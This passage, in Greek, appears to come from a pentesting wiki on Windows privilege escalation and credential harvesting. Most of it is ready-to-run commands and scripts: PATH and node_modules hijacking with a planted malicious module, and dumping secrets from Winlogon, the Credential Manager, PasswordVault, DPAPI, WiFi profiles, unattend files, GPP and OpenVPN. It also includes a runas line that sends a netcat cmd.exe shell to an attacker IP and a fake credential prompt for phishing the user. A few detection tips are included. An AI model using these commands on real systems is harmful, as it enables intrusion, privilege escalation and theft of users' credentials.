- Να επικυρώνετε το context του caller για privileged operations. Να προσθέτετε ελέγχους PP/PPL πριν επιτρέψετε τον τερματισμό διεργασιών ή την επιστροφή handles.
- Να περιορίζετε τα IOCTLs (access masks, METHOD_*, input validation) και να εξετάζετε brokered models αντί για άμεσα kernel privileges.

Ιδέες ανίχνευσης για defenders
- Να παρακολουθείτε user-mode ανοίγματα ύποπτων device names (π.χ. \\ .\\amsdk*) και συγκεκριμένες ακολουθίες IOCTL που υποδεικνύουν abuse.
- Να επιβάλλετε τη vulnerable driver blocklist της Microsoft (HVCI/WDAC/Smart App Control) και να διατηρείτε τις δικές σας allow/deny lists.


## PATH DLL Hijacking

Αν έχετε **write permissions μέσα σε έναν φάκελο που υπάρχει στο PATH**, ενδέχεται να μπορείτε να κάνετε hijack ένα DLL που φορτώνεται από μια διεργασία και να **κλιμακώσετε privileges**.<sup>[[2]](#references)</sup>

Ελέγξτε τα permissions όλων των φακέλων μέσα στο PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Για περισσότερες πληροφορίες σχετικά με το πώς γίνεται abuse αυτού του ελέγχου:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking μέσω `C:\node_modules`

Αυτή είναι μια παραλλαγή του **Windows uncontrolled search path**, η οποία επηρεάζει εφαρμογές **Node.js** και **Electron** όταν εκτελούν ένα bare import όπως το `require("foo")` και το αναμενόμενο module **λείπει**.<sup>[[20]](#references)</sup>

Το Node επιλύει packages διασχίζοντας το δέντρο καταλόγων προς τα πάνω και ελέγχοντας φακέλους `node_modules` σε κάθε γονικό κατάλογο. Στα Windows, αυτή η διαδικασία μπορεί να φτάσει στο root του drive, επομένως μια εφαρμογή που εκκινείται από το `C:\Users\Administrator\project\app.js` μπορεί τελικά να ελέγξει:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Αν ένας **low-privileged user** μπορεί να δημιουργήσει το `C:\node_modules`, μπορεί να τοποθετήσει ένα κακόβουλο `foo.js` (ή έναν φάκελο package) και να περιμένει ένα **Node/Electron process με υψηλότερα privileges** να επιλύσει το missing dependency. Το payload εκτελείται στο security context του victim process, επομένως αυτό γίνεται **LPE** όταν ο στόχος εκτελείται ως administrator, από elevated scheduled task/service wrapper ή από μια auto-started privileged desktop app.

Αυτό είναι ιδιαίτερα συνηθισμένο όταν:

- ένα dependency δηλώνεται στο `optionalDependencies`<sup>[[22]](#references)</sup>
- μια third-party library περιβάλλει το `require("foo")` με `try/catch` και συνεχίζει σε περίπτωση αποτυχίας
- ένα package αφαιρέθηκε από production builds, παραλείφθηκε κατά το packaging ή απέτυχε να εγκατασταθεί
- το ευάλωτο `require()` βρίσκεται βαθιά μέσα στο dependency tree αντί στον κύριο κώδικα της εφαρμογής

### Αναζήτηση ευάλωτων στόχων

Χρησιμοποιήστε το **Procmon** για να επιβεβαιώσετε το resolution path:<sup>[[23]](#references)</sup>

- Filter με `Process Name` = το target executable (`node.exe`, το Electron app EXE ή το wrapper process)
- Filter με `Path` `contains` `node_modules`
- Εστιάστε στα `NAME NOT FOUND` και στο τελικό επιτυχές open κάτω από το `C:\node_modules`

Χρήσιμα code-review patterns σε unpacked `.asar` files ή στα application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Εντοπίστε το **όνομα του πακέτου που λείπει** από το Procmon ή μέσω ελέγχου του πηγαίου κώδικα.
2. Δημιουργήστε τον ριζικό κατάλογο αναζήτησης, αν δεν υπάρχει ήδη:
```powershell
mkdir C:\node_modules
```
3. Τοποθετήστε ένα module με το ακριβώς αναμενόμενο όνομα:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Ενεργοποιήστε την εφαρμογή-θύμα. Αν η εφαρμογή επιχειρήσει `require("foo")` και το νόμιμο module απουσιάζει, το Node μπορεί να φορτώσει το `C:\node_modules\foo.js`.

Παραδείγματα από τον πραγματικό κόσμο για προαιρετικά modules που λείπουν και ταιριάζουν σε αυτό το μοτίβο περιλαμβάνουν τα `bluebird` και `utf-8-validate`, αλλά το **technique** είναι το επαναχρησιμοποιήσιμο μέρος: βρείτε οποιοδήποτε **missing bare import** που μια privileged Windows Node/Electron process θα επιλύσει.

### Ιδέες για Detection και hardening

- Δημιουργήστε alert όταν ένας χρήστης δημιουργεί το `C:\node_modules` ή γράφει νέα αρχεία/packages `.js` εκεί.
- Αναζητήστε high-integrity processes που διαβάζουν από το `C:\node_modules\*`.
- Συμπεριλάβετε όλα τα runtime dependencies στα production packages και ελέγξτε τη χρήση του `optionalDependencies`.
- Ελέγξτε κώδικα τρίτων για μοτίβα `try { require("...") } catch {}` που εκτελούνται σιωπηλά.
- Απενεργοποιήστε τα optional probes όταν το library το υποστηρίζει (για παράδειγμα, ορισμένα `ws` deployments μπορούν να αποφύγουν το legacy `utf-8-validate` probe με `WS_NO_UTF_8_VALIDATE=1`).

## Δίκτυο

### Κοινόχρηστοι πόροι
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Ελέγξτε για άλλους γνωστούς υπολογιστές που έχουν οριστεί hardcoded στο hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Διεπαφές δικτύου & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Ανοιχτές θύρες

Ελέγξτε για **περιορισμένες υπηρεσίες** από το εξωτερικό
```bash
netstat -ano #Opened ports?
```
### Πίνακας δρομολόγησης
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Πίνακας ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Κανόνες Firewall

[**Ελέγξτε αυτήν τη σελίδα για εντολές σχετικές με το Firewall**](../basic-cmd-for-pentesters.md#firewall) **(εμφάνιση κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερες[ εντολές για network enumeration εδώ](../basic-cmd-for-pentesters.md#network)

### Υποσύστημα Windows για Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Το binary `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσετε root user, μπορείτε να ακούτε σε οποιοδήποτε port (την πρώτη φορά που χρησιμοποιείτε το `nc.exe` για να ακούσετε σε ένα port, θα σας ρωτήσει μέσω GUI αν το `nc` θα πρέπει να επιτρέπεται από το firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Για να εκκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε το `--default-user root`

Μπορείτε να εξερευνήσετε το filesystem του `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Διαπιστευτήρια Windows

### Διαπιστευτήρια Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credential Manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Το Windows Vault αποθηκεύει διαπιστευτήρια χρηστών για servers, websites και άλλα προγράμματα, τα οποία τα **Windows** μπορούν να χρησιμοποιήσουν για την **αυτόματη σύνδεση των χρηστών**. Αρχικά, αυτό μπορεί να ακούγεται σαν οι χρήστες να μπορούν να αποθηκεύουν διαπιστευτήρια για sites όπως το Facebook, το Twitter ή το Gmail και να κάνουν τους browsers να συνδέονται αυτόματα, αλλά δεν λειτουργεί έτσι.

Το Windows Vault αποθηκεύει διαπιστευτήρια με τα οποία τα Windows μπορούν να συνδέουν αυτόματα τους χρήστες, πράγμα που σημαίνει ότι κάθε **Windows application που χρειάζεται διαπιστευτήρια για πρόσβαση σε έναν πόρο** (server ή website) **μπορεί να χρησιμοποιήσει αυτό το Credential Manager** & Windows Vault και να χρησιμοποιήσει τα παρεχόμενα διαπιστευτήρια, αντί οι χρήστες να εισάγουν συνεχώς το username και το password.

Εκτός αν οι εφαρμογές αλληλεπιδρούν με το Credential Manager, δεν νομίζω ότι είναι δυνατό να χρησιμοποιήσουν τα διαπιστευτήρια για έναν συγκεκριμένο πόρο. Επομένως, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το vault, θα πρέπει με κάποιον τρόπο να **επικοινωνήσει με το credential manager και να ζητήσει τα διαπιστευτήρια για αυτόν τον πόρο** από το default storage vault.

Χρησιμοποιήστε το `cmdkey` για να εμφανίσετε τα αποθηκευμένα διαπιστευτήρια στο machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το `runas` με την επιλογή `/savecred`, ώστε να χρησιμοποιήσετε τα αποθηκευμένα διαπιστευτήρια. Το ακόλουθο παράδειγμα καλεί ένα απομακρυσμένο binary μέσω ενός SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Χρήση του `runas` με ένα παρεχόμενο σύνολο διαπιστευτηρίων.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Σημειώστε ότι μπορείτε να χρησιμοποιήσετε τα mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ή το [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Οι σύγχρονες εφαρμογές Windows UWP, ο Microsoft Edge και οι σύγχρονες υπηρεσίες συστήματος αποθηκεύουν tokens ελέγχου ταυτότητας και κωδικούς πρόσβασης σε plaintext μέσα στο Universal Windows Platform (UWP) `PasswordVault` (εμφανίζεται επίσης ως `Web Credentials` στο `vaultcmd`). Αυτός ο χώρος αποθήκευσης είναι απομονωμένος ανά session και μπορεί να αποκρυπτογραφηθεί εγγενώς χωρίς δικαιώματα διαχειριστή ή `SeDebugPrivilege`.

Εκτελέστε αυτήν την εντολή PowerShell μέσα στο ενεργό session του χρήστη για να κάνετε άμεσα dump και αποκρυπτογράφηση όλων των αποθηκευμένων usernames και κωδικών πρόσβασης σε plaintext:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

Το **Data Protection API (DPAPI)** παρέχει μια μέθοδο συμμετρικής κρυπτογράφησης δεδομένων, η οποία χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ιδιωτικών ασύμμετρων κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος για να συμβάλλει σημαντικά στην εντροπία.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που προκύπτει από τα μυστικά σύνδεσης του χρήστη**. Σε σενάρια που περιλαμβάνουν κρυπτογράφηση συστήματος, χρησιμοποιεί τα μυστικά ελέγχου ταυτότητας του domain του συστήματος.

Τα κρυπτογραφημένα RSA κλειδιά χρηστών, μέσω του DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το `{SID}` αντιπροσωπεύει το [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) του χρήστη. **Το κλειδί DPAPI, το οποίο βρίσκεται μαζί με το master key που προστατεύει τα ιδιωτικά κλειδιά του χρήστη στο ίδιο αρχείο**, αποτελείται συνήθως από 64 bytes τυχαίων δεδομένων. (Είναι σημαντικό να σημειωθεί ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, με αποτέλεσμα να μην είναι δυνατή η εμφάνιση των περιεχομένων του μέσω της εντολής `dir` στο CMD, αν και μπορεί να εμφανιστεί μέσω του PowerShell.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα ορίσματα (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **credentials files που προστατεύονται από το master password** βρίσκονται συνήθως στο:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για αποκρυπτογράφηση.\
Μπορείτε να **εξαγάγετε πολλά DPAPI** **masterkeys** από τη **μνήμη** με το module `sekurlsa::dpapi` (αν είστε root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Διαπιστευτήρια PowerShell

Τα **διαπιστευτήρια PowerShell** χρησιμοποιούνται συχνά για **scripting** και εργασίες αυτοματοποίησης, ως ένας πρακτικός τρόπος αποθήκευσης κρυπτογραφημένων διαπιστευτηρίων. Τα διαπιστευτήρια προστατεύονται με το **DPAPI**, πράγμα που συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή στον οποίο δημιουργήθηκαν.

Για να **αποκρυπτογραφήσετε** διαπιστευτήρια PS από το αρχείο που τα περιέχει, μπορείτε να εκτελέσετε:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Αποθηκευμένες συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Εντολές που εκτελέστηκαν πρόσφατα
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Διαχειριστής διαπιστευτηρίων του Remote Desktop**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Χρησιμοποιήστε το module `dpapi::rdg` του **Mimikatz** με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε οποιαδήποτε αρχεία .rdg**\
Μπορείτε να **εξαγάγετε πολλά DPAPI masterkeys** από τη μνήμη με το module `sekurlsa::dpapi` του Mimikatz

### Sticky Notes

Οι χρήστες συχνά χρησιμοποιούν την εφαρμογή Sticky Notes σε Windows workstations για να **αποθηκεύουν passwords** και άλλες πληροφορίες, χωρίς να αντιλαμβάνονται ότι πρόκειται για αρχείο database. Αυτό το αρχείο βρίσκεται στη διεύθυνση `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` και αξίζει πάντα να αναζητείται και να εξετάζεται.

### AppCmd.exe

**Σημειώστε ότι για την ανάκτηση passwords από το AppCmd.exe πρέπει να είστε Administrator και να εκτελείτε τη διαδικασία σε επίπεδο High Integrity.**\
Το **AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\
Αν αυτό το αρχείο υπάρχει, είναι πιθανό να έχουν διαμορφωθεί ορισμένα **credentials** και να είναι δυνατή η **ανάκτησή** τους.

Αυτός ο κώδικας εξήχθη από το [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe` .\
Οι installers **εκτελούνται με δικαιώματα SYSTEM**, και πολλοί είναι ευάλωτοι σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Αρχεία και Registry (Διαπιστευτήρια)

### Διαπιστευτήρια Putty
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Κλειδιά SSH host του Putty
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Κλειδιά SSH στο registry

Τα ιδιωτικά κλειδιά SSH μπορούν να αποθηκεύονται μέσα στο κλειδί registry `HKCU\Software\OpenSSH\Agent\Keys`, επομένως θα πρέπει να ελέγξετε αν υπάρχει κάτι ενδιαφέρον εκεί:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Αν βρείτε οποιαδήποτε καταχώριση μέσα σε αυτήν τη διαδρομή, πιθανότατα θα είναι ένα αποθηκευμένο SSH key. Αποθηκεύεται κρυπτογραφημένο, αλλά μπορεί να αποκρυπτογραφηθεί εύκολα χρησιμοποιώντας το [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Περισσότερες πληροφορίες σχετικά με αυτήν την τεχνική εδώ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Αν η υπηρεσία `ssh-agent` δεν εκτελείται και θέλετε να ξεκινά αυτόματα κατά την εκκίνηση, εκτελέστε:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Φαίνεται ότι αυτή η τεχνική δεν είναι πλέον έγκυρη. Προσπάθησα να δημιουργήσω ορισμένα ssh keys, να τα προσθέσω με το `ssh-add` και να συνδεθώ μέσω ssh σε ένα μηχάνημα. Το registry HKCU\Software\OpenSSH\Agent\Keys δεν υπάρχει και το procmon δεν εντόπισε τη χρήση του `dpapi.dll` κατά τον έλεγχο ταυτότητας με ασύμμετρο κλειδί.

### Μη επιτηρούμενα αρχεία
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Μπορείτε επίσης να αναζητήσετε αυτά τα αρχεία χρησιμοποιώντας το **metasploit**: _post/windows/gather/enum_unattend_

Παράδειγμα περιεχομένου:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### Αντίγραφα ασφαλείας SAM & SYSTEM
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Διαπιστευτήρια Cloud
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

Αναζητήστε ένα αρχείο με το όνομα **SiteList.xml**

### Cached GPP Password

Παλαιότερα ήταν διαθέσιμη μια δυνατότητα που επέτρεπε την ανάπτυξη προσαρμοσμένων local administrator accounts σε μια ομάδα μηχανημάτων μέσω του Group Policy Preferences (GPP). Ωστόσο, αυτή η μέθοδος είχε σημαντικά κενά ασφαλείας. Αρχικά, τα Group Policy Objects (GPOs), τα οποία αποθηκεύονταν ως αρχεία XML στο SYSVOL, μπορούσαν να προσπελαστούν από οποιονδήποτε domain user. Επιπλέον, τα passwords μέσα σε αυτά τα GPPs, τα οποία ήταν κρυπτογραφημένα με AES256 χρησιμοποιώντας ένα δημοσίως τεκμηριωμένο default key, μπορούσαν να αποκρυπτογραφηθούν από οποιονδήποτε authenticated user. Αυτό αποτελούσε σοβαρό κίνδυνο, καθώς μπορούσε να επιτρέψει στους users να αποκτήσουν elevated privileges.

Για τον περιορισμό αυτού του κινδύνου, αναπτύχθηκε μια function που πραγματοποιεί αναζήτηση για locally cached GPP files τα οποία περιέχουν ένα πεδίο "cpassword" που δεν είναι κενό. Όταν εντοπιστεί ένα τέτοιο αρχείο, η function αποκρυπτογραφεί το password και επιστρέφει ένα custom PowerShell object. Αυτό το object περιλαμβάνει λεπτομέρειες σχετικά με το GPP και την τοποθεσία του αρχείου, βοηθώντας στον εντοπισμό και την αποκατάσταση αυτής της ευπάθειας ασφαλείας.

Αναζητήστε τα παρακάτω αρχεία στο `C:\ProgramData\Microsoft\Group Policy\history` ή στο _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (πριν από τα Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Για να αποκρυπτογραφήσετε το cPassword:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Χρήση του crackmapexec για την απόκτηση των κωδικών πρόσβασης:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Παράδειγμα web.config με διαπιστευτήρια:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### Διαπιστευτήρια OpenVPN
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Καταγραφές
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Ζητήστε διαπιστευτήρια

Μπορείτε πάντα να **ζητήσετε από τον χρήστη να εισαγάγει τα διαπιστευτήριά του ή ακόμη και τα διαπιστευτήρια διαφορετικού χρήστη** αν πιστεύετε ότι μπορεί να τα γνωρίζει (σημειώστε ότι το να **ζητήσετε** απευθείας από τον πελάτη τα **διαπιστευτήρια** είναι πραγματικά **επικίνδυνο**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Πιθανά ονόματα αρχείων που περιέχουν credentials**

Γνωστά αρχεία που παλαιότερα περιείχαν **κωδικούς πρόσβασης** σε **clear-text** ή **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
